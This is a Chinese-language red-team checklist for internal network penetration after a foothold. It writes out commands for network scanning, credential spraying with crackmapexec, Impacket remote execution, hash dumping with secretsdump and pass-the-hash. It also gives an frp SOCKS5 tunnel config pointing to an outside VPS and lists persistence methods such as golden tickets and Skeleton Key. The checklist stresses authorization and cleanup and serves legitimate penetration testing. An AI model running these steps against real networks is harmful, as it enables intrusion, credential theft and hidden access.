# 05 · 内网渗透清单

> 从边界机进入内网后的标准动作，按顺序执行不漏项。

## 0. 前提

- ⚠️ **授权书在手**，范围明确。内网渗透未经授权 = 违法。

## 1. 边界机信息收集（Linux / Windows 通用思路）

```bash
ip a / ipconfig /all          # 网卡 → 判断网段与是否双网卡
arp -a                        # 内网存活线索
route -n / route print        # 路由表 → 其他网段
```

## 2. 内网扫描（fscan 一把梭）

```bash
fscan -h 192.168.1.0/24
# 输出: 存活主机、开放端口、弱口令、常见漏洞(MS17-010/Redis未授权等)
```

手动补充：
```bash
# 探测常见服务端口
nmap -sT -Pn -p 445,135,139,3389,22,80,443,3306,6379,445 --open <网段>/24
```

## 3. 横向移动

### 密码复用
- 拿到的凭据先试：数据库、SMB、RDP、SSH
- `crackmapexec smb 192.168.1.0/24 -u user -p pass` 批量验证

### Windows 域内
```bash
net user /domain               # 域用户
net group "domain admins" /domain
nltest /dsgetdc:域名           # 找域控
# Impacket 系列
impacket-wmiexec domain/user:pass@10.0.0.5
impacket-psexec domain/user:pass@10.0.0.5
impacket-secretsdump domain/user:pass@10.0.0.5   # 导 hash
```

### Hash 传递（PTH）
```bash
impacket-wmiexec -hashes :<NTLM> administrator@10.0.0.5
```

## 4. 隧道与代理

| 场景 | 工具 |
|---|---|
| 内网机器能出网 | frp 反向代理（vps 跑 frps，边界机跑 frpc） |
| 只能 TCP 出网 | nps / chisel |
| HTTP 出网 | 隧道走 HTTP 伪装 |
| 多层内网 | 逐层跳板，注意路由叠加 |

```ini
# frpc.ini 边界机
[common]
server_addr = vps_ip
server_port = 7000
[socks5]
type = socks5
remote_port = 1080
```

## 5. 权限维持（红队场景，防守方学习重点）

- 计划任务、服务、注册表启动项
- 黄金票据/白银票据（域）
- Skeleton Key（需域控权限）
- ⚠️ 维持手段要在授权与交付范围内，测试后**清理干净**

## 6. 收尾

- 记录攻击路径（每一跳的凭据与漏洞点）
- 清理：账号、计划任务、上传工具、日志痕迹报告给甲方（应急场景）

## 常见漏洞速查

| 漏洞 | 端口/特征 |
|---|---|
| MS17-010（永恒之蓝） | 445 |
| Redis 未授权 | 6379 |
| SMB 空密码/弱口令 | 445 |
| 域内 Kerberoasting | 88 (Kerberos) |
| Zabbix/Jenkins/Weblogic 弱口令 | 各自 Web 端口 |
